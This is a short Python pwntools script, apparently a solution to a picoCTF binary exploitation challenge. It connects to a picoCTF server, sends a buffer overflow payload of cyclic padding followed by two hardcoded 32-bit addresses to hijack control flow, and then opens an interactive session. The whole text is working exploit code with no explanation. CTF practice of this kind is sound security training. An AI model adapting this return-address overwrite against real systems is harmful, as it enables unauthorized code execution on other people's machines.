from pwn import *

p = process('./vuln')
p = connect('saturn.picoctf.net', 64188)

payload = cyclic(cyclic_find('aaea'))
payload += p32(0x08049d90)
payload += p32(0x08049e10)

pause()

p.sendline(payload)
p.interactive()

